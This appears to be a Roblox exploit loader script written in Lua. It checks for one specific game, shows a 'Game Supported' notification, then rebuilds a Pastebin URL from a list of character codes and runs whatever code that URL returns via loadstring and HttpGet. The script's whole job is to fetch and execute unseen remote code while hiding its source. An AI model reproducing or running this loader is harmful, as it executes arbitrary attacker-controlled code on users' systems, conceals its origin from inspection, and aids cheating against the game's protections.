local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")

local correctPlaceId = 4480809144

local function notify(title, text)
	pcall(function()
		StarterGui:SetCore("SendNotification", {
			Title = title,
			Text = text,
			Duration = 3
		})
	end)
end

local encodedURL = {
	104,116,116,112,115,58,47,47,
	112,97,115,116,101,98,105,110,
	46,99,111,109,47,114,97,119,
	47,74,54,75,101,122,106,121,116
}

local function decode(t)
	local s = ""
	for i = 1, #t do
		s = s .. string.char(t[i])
	end
	return s
end

if game.PlaceId == correctPlaceId then
	notify("SUCCESS", "Game Supported")

	local url = decode(encodedURL)
	loadstring(game:HttpGet(url))()

else
	notify("NOT SUPPORTED", "Sorry, this game is not supported")
end
